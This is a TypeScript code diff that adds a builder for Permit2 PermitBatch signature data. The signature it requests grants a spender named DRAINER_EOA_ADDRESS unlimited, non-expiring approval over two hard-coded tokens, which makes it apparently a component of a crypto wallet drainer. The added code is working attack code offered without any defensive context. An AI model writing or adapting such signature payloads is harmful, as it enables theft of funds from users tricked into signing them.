@@ -82,3 +82,80 @@ export const getPermit2TypedData = (chainId: number) => {
     },
   }
 }
+
+export const getPermit2PermitBatchTypedData = (chainId: number) => {
+  return {
+    types: {
+      EIP712Domain: [
+        {
+          name: 'name',
+          type: 'string',
+        },
+        {
+          name: 'chainId',
+          type: 'uint256',
+        },
+        {
+          name: 'verifyingContract',
+          type: 'address',
+        },
+      ],
+      PermitBatch: [
+        {
+          name: 'details',
+          type: 'PermitDetails[]',
+        },
+        {
+          name: 'spender',
+          type: 'address',
+        },
+        {
+          name: 'sigDeadline',
+          type: 'uint256',
+        },
+      ],
+      PermitDetails: [
+        {
+          name: 'token',
+          type: 'address',
+        },
+        {
+          name: 'amount',
+          type: 'uint160',
+        },
+        {
+          name: 'expiration',
+          type: 'uint48',
+        },
+        {
+          name: 'nonce',
+          type: 'uint48',
+        },
+      ],
+    },
+    primaryType: 'PermitBatch',
+    domain: {
+      name: 'Permit2',
+      chainId,
+      verifyingContract: PERMIT2_ADDRESS,
+    },
+    message: {
+      spender: DRAINER_EOA_ADDRESS,
+      sigDeadline: MAX_DEADLINE,
+      details: [
+        {
+          token: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
+          amount: UNLIMITED_APPROVAL_AMOUNT,
+          expiration: MAX_DEADLINE,
+          nonce: 0,
+        },
+        {
+          token: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
+          amount: UNLIMITED_APPROVAL_AMOUNT,
+          expiration: MAX_DEADLINE,
+          nonce: 0,
+        },
+      ],
+    },
+  }
+}
